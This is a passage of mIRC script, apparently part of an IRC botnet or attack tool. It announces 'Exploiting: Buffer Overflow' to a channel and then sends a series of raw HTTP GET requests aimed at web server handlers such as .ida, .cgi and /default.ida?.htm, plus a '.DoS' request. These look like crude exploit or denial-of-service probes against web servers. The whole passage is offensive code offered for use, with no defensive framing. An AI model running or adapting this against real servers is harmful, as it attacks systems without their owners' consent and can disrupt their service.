  msg %c 4[15Exploiting: Buffer Overflow4]
  sockwrite -n $sockname GET .html
  sockwrite -n $sockname GET .htm
  sockwrite -n $sockname GET .cgi
  sockwrite -n $sockname GET .jsp
  sockwrite -n $sockname GET .php
  sockwrite -n $sockname GET .ida
  sockwrite -n $sockname GET .DoS
  sockwrite -n $sockname GET /report.cgi?.htm
  sockwrite -n $sockname GET /index.cgi?.htm
  sockwrite -n $sockname GET /load.cgi?.htm
  sockwrite -n $sockname GET /query.cgi?.htm
  sockwrite -n $sockname GET /default.ida?.htm
}
